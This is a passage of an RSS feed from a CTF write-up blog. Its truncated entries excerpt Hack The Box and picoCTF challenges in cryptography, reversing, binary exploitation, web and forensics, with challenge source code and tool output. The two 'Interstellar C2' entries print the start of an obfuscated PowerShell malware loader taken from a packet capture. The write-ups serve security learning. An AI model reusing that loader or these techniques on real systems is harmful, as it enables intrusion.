Cipher analysis The one that looks interesting is iknowmag1k, which is Base64-encoded (and URL-encoded: %2B is +, %2F is / and %3D is =). If we decode it, we have 40 bytes that look random:</description></item><item><title>I'm gRoot</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/im-groot/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/im-groot/</guid><description>We are given the Python source code of a server:
server.py: from pymerkle import InmemoryTree as MerkleTree from hashlib import sha256 from os import urandom from secret import FLAG from utils import * class Transaction: def __init__(self, _from, _to): self._from = _from self._to = _to self._signature = self.getSignature(self._from, self._to) def signature(self): return self._signature def getSignature(self, _from, _to): return sha256(_from + _to).digest() class Block: def __init__(self): self._transactions = [] def transactions(self): return self.</description></item><item><title>Iced TEA</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/iced-tea/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/iced-tea/</guid><description>We are given the Python source code that encrypts the flag:
import os from secret import FLAG from Crypto.Util.Padding import pad from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b from enum import Enum class Mode(Enum): ECB = 0x01 CBC = 0x02 class Cipher: def __init__(self, key, iv=None): self.BLOCK_SIZE = 64 self.KEY = [b2l(key[i:i+self.BLOCK_SIZE//16]) for i in range(0, len(key), self.BLOCK_SIZE//16)] self.DELTA = 0x9e3779b9 self.IV = iv if self.IV: self.mode = Mode.</description></item><item><title>Illumination</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/illumination/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/illumination/</guid><description>This is a JavaScript project that is using Git as version control. In the project there is a bot.js file and a config.json file. In the second one there is a string encoded in Base64:
{ "token": "Replace me with token when in use! Security Risk!", "prefix": "~", "lightNum": "1337", "username": "UmVkIEhlcnJpbmcsIHJlYWQgdGhlIEpTIGNhcmVmdWxseQ==", "host": "127.0.0.1" } $ echo UmVkIEhlcnJpbmcsIHJlYWQgdGhlIEpTIGNhcmVmdWxseQ== | base64 -d Red Herring, read the JS carefully The token key seems interesting.</description></item><item><title>IMC 1999, Problem 1</title><link>https://7rocky.github.io/en/imc/problem-1-1999/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-1-1999/</guid><description/></item><item><title>IMC 1999, Problem 7</title><link>https://7rocky.github.io/en/imc/problem-7-1999/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-7-1999/</guid><description/></item><item><title>IMC 2000, Problem 3</title><link>https://7rocky.github.io/en/imc/problem-3-2000/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-3-2000/</guid><description/></item><item><title>IMC 2004, Problem 7</title><link>https://7rocky.github.io/en/imc/problem-7-2004/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-7-2004/</guid><description/></item><item><title>IMC 2004, Problem 8</title><link>https://7rocky.github.io/en/imc/problem-8-2004/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-8-2004/</guid><description/></item><item><title>IMC 2005, Problem 1</title><link>https://7rocky.github.io/en/imc/problem-1-2005/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-1-2005/</guid><description/></item><item><title>IMC 2005, Problem 8</title><link>https://7rocky.github.io/en/imc/problem-8-2005/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-8-2005/</guid><description/></item><item><title>IMC 2006, Problem 1</title><link>https://7rocky.github.io/en/imc/problem-1-2006/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-1-2006/</guid><description/></item><item><title>IMC 2007, Problem 7</title><link>https://7rocky.github.io/en/imc/problem-7-2007/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-7-2007/</guid><description/></item><item><title>IMC 2010, Problem 1</title><link>https://7rocky.github.io/en/imc/problem-1-2010/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-1-2010/</guid><description/></item><item><title>IMC 2012, Problem 2</title><link>https://7rocky.github.io/en/imc/problem-2-2012/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-2-2012/</guid><description/></item><item><title>IMC 2013, Problem 1</title><link>https://7rocky.github.io/en/imc/problem-1-2013/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-1-2013/</guid><description/></item><item><title>IMC 2013, Problem 6</title><link>https://7rocky.github.io/en/imc/problem-6-2013/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-6-2013/</guid><description/></item><item><title>IMC 2017, Problem 6</title><link>https://7rocky.github.io/en/imc/problem-6-2017/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-6-2017/</guid><description/></item><item><title>IMC 2018, Problem 1</title><link>https://7rocky.github.io/en/imc/problem-1-2018/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-1-2018/</guid><description/></item><item><title>IMC 2019, Problem 1</title><link>https://7rocky.github.io/en/imc/problem-1-2019/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-1-2019/</guid><description/></item><item><title>IMC 2019, Problem 2</title><link>https://7rocky.github.io/en/imc/problem-2-2019/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-2-2019/</guid><description/></item><item><title>IMC 2019, Problem 5</title><link>https://7rocky.github.io/en/imc/problem-5-2019/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-5-2019/</guid><description/></item><item><title>IMC 2019, Problem 7</title><link>https://7rocky.github.io/en/imc/problem-7-2019/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-7-2019/</guid><description/></item><item><title>IMC 2020, Problem 2</title><link>https://7rocky.github.io/en/imc/problem-2-2020/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-2-2020/</guid><description/></item><item><title>IMC 2021, Problem 1</title><link>https://7rocky.github.io/en/imc/problem-1-2021/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/imc/problem-1-2021/</guid><description/></item><item><title>Impossible Password</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/impossible-password/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/impossible-password/</guid><description>We have a binary called impossible_password.bin:
$ file impossible_password.bin impossible_password.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ba116ba1912a8c3779ddeb579404e2fdf34b1568, stripped Dynamic analysis If we run it, it waits for user input:
$ ./impossible_password.bin * asdf [asdf] Strings Using strings to how printable characters of the binary we can see SuperSeKretKey:
$ strings impossible_password.bin /lib64/ld-linux-x86-64.so.2 libc.so.6 exit srand __isoc99_scanf time putchar printf malloc strcmp __libc_start_main __gmon_start__ GLIBC_2.</description></item><item><title>Infiltration</title><link>https://7rocky.github.io/en/ctf/htb-challenges/osint/infiltration/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/osint/infiltration/</guid><description>We have this challenge description:
Can you find something to help you break into the company &amp;lsquo;Evil Corp LLC&amp;rsquo;. Recon social media sites to see if you can find any useful information.
LinkedIn We can start by entering the name of the company in a search engine:
The first thing that pops out is LinkedIn:
Here we have a fake flag. We can examine the company&amp;rsquo;s website, but there&amp;rsquo;s nothing interesting:</description></item><item><title>Infinite Descent</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/infinite-descent/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/infinite-descent/</guid><description>We are given a Python with a weird RSA implementation (fastprimes.py):
#!/usr/bin/env python #********************************************************************** # filename: fasterprimes.py # version: 0.06.2-alpha # release date: 20170806 # dev: Cayce Pollard # qa: NOT PASSED, open defects. # finds a specified length prime, then a neighbouring prime for speed. # DEFECTS # ID[243], category A4, owner: CayceP, comment: may have to be run several times to generate valid RSA values # ID[552], category A9, owner: AppSec, comment: Do neighbouring primes present a security risk?</description></item><item><title>Infinite Knapsack</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/infinite-knapsack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/infinite-knapsack/</guid><description>We are given the Python source code to encrypt the flag:
from random import randint, seed, sample, getstate import math from secret import SEED, FLAG, INIT class MH: def __init__(self, size): keys = self.generateKeys(size) self.public_key = keys[0] self.private_key = keys[1] def generateKeys(self, n): private_key = [INIT] + [0 for _ in range(n - 1)] for i in range(1, n): total = sum(private_key) private_key[i] = randint(total * 2, total * 3) total = sum(private_key) modulo = randint(total * 2, total * 3) while True: multiplier = randint(modulo // 4, modulo - 1) if math.</description></item><item><title>information</title><link>https://7rocky.github.io/en/ctf/picoctf/forensics/information/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/forensics/information/</guid><description>We are given a JPEG image called cat.jpg:
The file is recognized as a proper JPEG image:
$ file cat.jpg cat.jpg: JPEG image data, JFIF standard 1.02, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 2560x1598, components 3 However, if we extract the file metadata, we will see something strange:
$ exiftool cat.jpg ExifTool Version Number : 12.30 File Name : cat.jpg Directory : . File Size : 858 KiB File Modification Date/Time : File Access Date/Time : File Inode Change Date/Time : File Permissions : -rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.</description></item><item><title>Initialization</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/initialization/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/initialization/</guid><description>We are given the Python source code to encrypt the flag:
#!/usr/bin/env python3 import os from Crypto.Util import Counter from Crypto.Util.Padding import pad from Crypto.Cipher import AES class AdvancedEncryption: def __init__(self, block_size): self.KEYS = self.generate_encryption_keys() self.CTRs = [Counter.new(block_size) for i in range(len(MSG))] # nonce reuse : avoided! def generate_encryption_keys(self): keys = [[b'\x00']*16] * len(MSG) for i in range(len(keys)): for j in range(len(keys[i])): keys[i][j] = os.urandom(1) return keys def encrypt(self, i, msg): key = b''.</description></item><item><title>Insane Bolt</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/insane-bolt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/insane-bolt/</guid><description>We have this game:
$ nc 206.189.125.243 30182 1. Instructions 2. Play &amp;gt; 1 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 [*] Help the 🤖 reach the 💎. 🔩 🔩 [*] You need to find the shortest route. 🔩 🔩 [*] You need to collect 500 💎 and at least 5000 🔩.</description></item><item><title>Inside The Matrix</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/inside-the-matrix/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/inside-the-matrix/</guid><description>We are given the source code of the server in Python:
from utils import ascii_print import os from secret import FLAG from Crypto.Util.number import getPrime from matrix import Matrix from sympy import randprime assert len(FLAG) == 25 class Book: def __init__(self): self.size = 5 self.prime = None def parse(self, pt: bytes): pt = [b for b in pt] return Matrix(self.prime, self.size, self.size, pt) def generate(self): key = os.urandom(self.size**2) return self.parse(key) def rotate(self): self.</description></item><item><title>Inside The Matrix</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/inside-the-matrix/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/inside-the-matrix/</guid><description>We are given the source code of the server in Python:
from sage.all_cmdline import * # from utils import ascii_print import os FLAG = b"HTB{????????????????????}" assert len(FLAG) == 25 class Book: def __init__(self): self.size = 5 self.prime = None def parse(self, pt: bytes): pt = [b for b in pt] return matrix(GF(self.prime), self.size, self.size, pt) def generate(self): key = os.urandom(self.size**2) return self.parse(key) def rotate(self): self.prime = random_prime(2**6, False, 2**4) def encrypt(self, message: bytes): self.</description></item><item><title>Insider</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/insider/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/insider/</guid><description>We are given a folder called Mozilla with a lot of Firefox files:
$ find Mozilla -type f Mozilla/Firefox/installs.ini Mozilla/Firefox/profiles.ini Mozilla/Firefox/Profiles/yodxf5e0.default/times.json Mozilla/Firefox/Profiles/2542z9mo.default-release/sessionstore-backups/recovery.baklz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/sessionstore-backups/recovery.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/weave/failed/tabs.json Mozilla/Firefox/Profiles/2542z9mo.default-release/weave/toFetch/tabs.json Mozilla/Firefox/Profiles/2542z9mo.default-release/favicons.sqlite-shm Mozilla/Firefox/Profiles/2542z9mo.default-release/compatibility.ini Mozilla/Firefox/Profiles/2542z9mo.default-release/favicons.sqlite-wal Mozilla/Firefox/Profiles/2542z9mo.default-release/addons.json Mozilla/Firefox/Profiles/2542z9mo.default-release/logins.json Mozilla/Firefox/Profiles/2542z9mo.default-release/search.json.mozlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/sessionCheckpoints.json Mozilla/Firefox/Profiles/2542z9mo.default-release/pkcs11.txt Mozilla/Firefox/Profiles/2542z9mo.default-release/times.json Mozilla/Firefox/Profiles/2542z9mo.default-release/extension-preferences.json Mozilla/Firefox/Profiles/2542z9mo.default-release/addonStartup.json.lz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/crashes/store.json.mozlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/key4.db Mozilla/Firefox/Profiles/2542z9mo.default-release/webappsstore.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/protections.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/places.sqlite-wal Mozilla/Firefox/Profiles/2542z9mo.default-release/security_state/data.safe.bin Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/state.json Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/aborted-session-ping Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/session-state.json Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/archived/2020-11/1604498649754.5212ab6a-268f-4c2b-aa0b-cf46c3d1dc71.event.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/archived/2020-11/1604509449817.7d32a9b1-03f4-4155-8f99-ebd1cceb30d5.event.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/archived/2020-11/1604496849746.014e92ae-cb57-4c0e-a97c-66ffa45bfe20.new-profile.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/archived/2020-11/1604507415845.36b506e6-3dea-4646-8ae3-62e9fd1b4692.main.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/broadcast-listeners.json Mozilla/Firefox/Profiles/2542z9mo.default-release/cookies.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/places.sqlite-shm Mozilla/Firefox/Profiles/2542z9mo.default-release/containers.json Mozilla/Firefox/Profiles/2542z9mo.default-release/formhistory.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/default/moz-extension+++7b958ab1-a8d2-4943-8833-5185e9a8d9d0^userContextId=4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/default/moz-extension+++7b958ab1-a8d2-4943-8833-5185e9a8d9d0^userContextId=4294967295/.metadata-v2 Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/3561288849sdhlie.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite-shm Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite-wal Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/.metadata-v2 Mozilla/Firefox/Profiles/2542z9mo.default-release/extensions.json Mozilla/Firefox/Profiles/2542z9mo.default-release/handlers.json Mozilla/Firefox/Profiles/2542z9mo.default-release/bookmarkbackups/bookmarks-2020-11-04_11_Xwf6HUY0M1+1NgBa9qQfXA==.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/content-prefs.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/gmp-gmpopenh264/1.8.1.1/gmpopenh264.info Mozilla/Firefox/Profiles/2542z9mo.</description></item><item><title>Insp3ct0r</title><link>https://7rocky.github.io/en/ctf/picoctf/web-exploitation/insp3ct0r/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/web-exploitation/insp3ct0r/</guid><description>We are given a website like this:
As the page suggests, we must inspect the HTML code of the website (shortcut: Ctrl + U):
We can see a piece of the flag. Let&amp;rsquo;s inspect the CSS file (mycss.css):
Alright, we got another piece. We can take a look at the JS file (myjs.js):
Perfect, we can join all pieces to form the flag: picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?f10be399}.</description></item><item><title>Instructive</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/instructive/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/instructive/</guid><description>We are given a 64-bit binary called instructive:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Reverse engineering If load the binary in Ghidra, we will see this main function:
int main() { int ret; undefined flag[136]; char *data; FILE *fp; int j; int i; setbuf(stdout, NULL); setbuf(stdin, NULL); fp = fopen("./flag.txt", "r"); __isoc99_fscanf(fp, "%s", flag); data = (char *) malloc(128); printf("Please enter your username: "</description></item><item><title>Interception</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/interception/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/interception/</guid><description>We are given the Python source code of the server. This is server.py:
#!/usr/bin/env python3 import signal import random, os from hashlib import sha256 from Crypto.Util.number import isPrime, getPrime, long_to_bytes, bytes_to_long from Crypto.Util.Padding import pad, unpad from Crypto.Cipher import AES from pool import GREET, ANS from secret import RESTRICTED class GRAS: def __init__(self, m, p, q): self.m = m self.a = 0xdeadbeef self.p = p self.q = q def generate_key(self): ct = 0x1337 # this loop runs in milliseconds in our super computer for _ in range(self.</description></item><item><title>Intergalactic Post</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/intergalactic-post/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/intergalactic-post/</guid><description>We are given a PHP web application with a single functionality, that is to post an email address.
We can start by analyzing the source code. The file index.php shows that there are only two endpoints (GET and POST):
&amp;lt;?php spl_autoload_register(function ($name){ if (preg_match('/Controller$/', $name)) { $name = "controllers/${name}"; } else if (preg_match('/Model$/', $name)) { $name = "models/${name}"; } include_once "${name}.php"; }); $database = new Database('/tmp/challenge.db'); $router = new Router(); $router-&amp;gt;new('GET', '/', 'IndexController@index'); $router-&amp;gt;new('POST', '/subscribe', 'SubsController@store'); die($router-&amp;gt;match()); We can see that Database.</description></item><item><title>Interstellar C2</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/interstellar-c2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/interstellar-c2/</guid><description>We are given a PCAP file called capture.pcapng. Let&amp;rsquo;s open it in Wireshark:
As always, it is nice to start analyzing top-level protocols like HTTP, so let&amp;rsquo;s apply a filter:
The first request is trying to download a PowerShell script called vn84.ps1:
PowerShell deobfuscation We can take the script from Wireshark and read it here:
.("{1}{0}{2}" -f'T','Set-i','em') ('vAriA'+'ble'+':q'+'L'+'z0so') ( [tYpe]("{0}{1}{2}{3}" -F'SySTEM.i','o.Fi','lE','mode')) ; &amp;amp;("{0}{2}{1}" -f'set-Vari','E','ABL') l60Yu3 ( [tYPe]("{7}{0}{5}{4}{3}{1}{2}{6}"-F'm.','ph','Y.ae','A','TY.crypTOgR','SeCuRi','S','sYSte')); .("{0}{2}{1}{3}" -f 'Set-V','i','AR','aBle') BI34 ( [TyPE]("</description></item><item><title>Interstellar C2</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/interstellar-c2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/interstellar-c2/</guid><description>We are given a PCAP file called capture.pcapng. Let&amp;rsquo;s open it in Wireshark:
As always, it is nice to start analyzing top-level protocols like HTTP, so let&amp;rsquo;s apply a filter:
The first request is trying to download a PowerShell script called vn84.ps1:
PowerShell deobfuscation We can take the script from Wireshark and read it here:
.("{1}{0}{2}" -f'T','Set-i','em') ('vAriA'+'ble'+':q'+'L'+'z0so') ( [tYpe]("{0}{1}{2}{3}" -F'SySTEM.i','o.Fi','lE','mode')) ; &amp;amp;("{0}{2}{1}" -f'set-Vari','E','ABL') l60Yu3 ( [tYPe]("{7}{0}{5}{4}{3}{1}{2}{6}"-F'm.','ph','Y.ae','A','TY.crypTOgR','SeCuRi','S','sYSte')); .("{0}{2}{1}{3}" -f 'Set-V','i','AR','aBle') BI34 ( [TyPE]("</description></item><item><title>IRCware</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/ircware/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/ircware/</guid><description>We have a binary called ircware:
$ file ircware ircware: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, stripped Basic analysis If we open it in Ghidra straight away, the decompiled C code will be very difficult to understand because the binary is stripped (there are not symbols). Instead, we can try to execute it:
$ ./ircware EXCEPTION! ABORT Well, nothing useful. With ltrace we can log all external function calls:</description></item><item><title>Irish Flan</title><link>https://7rocky.github.io/en/ctf/other/ecsc-2023/irish-flan/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/ecsc-2023/irish-flan/</guid><description>Yum, time for dessert.
Challenge contributed by CryptoHack
Challenge files:
output.txt irish_flan.py We are given a Python script that uses quaternions to hide an AES key used to encrypt the flag. The quaternion implementation is based on Python classes. We can assume that the implementation is correct (although there is a bug in the power of a quaternion, but it is not intended).
Source code analysis The relevant part of the script is:</description></item><item><title>Janken</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/janken/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/janken/</guid><description>We are given a binary file called janken and a remote instance to connect to:
$ file janken janken: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./.glibc/ld-linux-x86-64.so.2, BuildID[sha1]=56b54cdae265aa352fe2ebb016f86af831fd58d3, for GNU/Linux 3.2.0, not stripped It is a Rock-Paper-Scissors game:
$ nc 167.99.86.8 31902 ▛▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▜ ▌ じ ゃ ん 拳 ▐ ▙▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▟ 1. ℙ ∟ ₳ Ұ 2. ℜ ℧ ∟ Ӗ ⅀ &amp;gt;&amp;gt; 2 ▛▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▜ ▚ [*] Rock is called "</description></item><item><title>Jeeves</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/jeeves/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/jeeves/</guid><description>We are given a 64-bit binary called jeeves:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled We can use Ghidra to analyze the binary and look at the decompiled source code in C. This is main:
int main() { char name[44]; int fd; void *data; uint code; code = 0xdeadc0d3; printf("Hello, good sir!\nMay I have your name? "); gets(name); printf("Hello %s, hope you have a good day!</description></item><item><title>Jenny From The Block</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/jenny-from-the-block/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/jenny-from-the-block/</guid><description>We are given this Python source code:
from hashlib import sha256 from Crypto.Util.Padding import pad, unpad import signal import subprocess import socketserver import os allowed_commands = [b'whoami', b'ls', b'cat secret.txt', b'pwd'] BLOCK_SIZE = 32 def encrypt_block(block, secret): enc_block = b'' for i in range(BLOCK_SIZE): val = (block[i]+secret[i]) % 256 enc_block += bytes([val]) return enc_block def encrypt(msg, password): h = sha256(password).digest() if len(msg) % BLOCK_SIZE != 0: msg = pad(msg, BLOCK_SIZE) blocks = [msg[i:i+BLOCK_SIZE] for i in range(0, len(msg), BLOCK_SIZE)] ct = b'' for block in blocks: enc_block = encrypt_block(block, h) h = sha256(enc_block + block).</description></item><item><title>Jorge Wants a Token</title><link>https://7rocky.github.io/en/ctf/other/hackon-ctf/jorge-wants-a-token/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackon-ctf/jorge-wants-a-token/</guid><description>We are provided with the source code of the server in Python. On the one hand we have administation.py (the main file), and on the other we have library.py (auxiliary functions). The server gives us these options:
$ nc 0.cloud.chals.io 15980 __ __ __ ____ / / / /___ ______/ /__/ __ \____ / /_/ / __ `/ ___/ //_/ / / / __ \ / __ / /_/ / /__/ ,&amp;lt; / /_/ / / / / /_/ /_/\__,_/\___/_/|_|\____/_/ /_/ Welcome to the HackOn administration.</description></item><item><title>Juggling facts</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/juggling-facts/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/juggling-facts/</guid><description>We are given this website:
Static code analysis We also have the PHP source code of the web application. The relevant part is in controllers/IndexController.php:
&amp;lt;?php class IndexController extends Controller { public function __construct() { parent::__construct(); } public function index($router) { $router-&amp;gt;view('index'); } public function getfacts($router) { $jsondata = json_decode(file_get_contents('php://input'), true); if ( empty($jsondata) || !array_key_exists('type', $jsondata)) { return $router-&amp;gt;jsonify(['message' =&amp;gt; 'Insufficient parameters!']); } if ($jsondata['type'] === 'secrets' &amp;amp;&amp;amp; $_SERVER['REMOTE_ADDR'] !</description></item><item><title>Juggling Facts</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/juggling-facts/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/juggling-facts/</guid><description>We are given this website:
Static code analysis We also have the PHP source code of the web application. The relevant part is in controllers/IndexController.php:
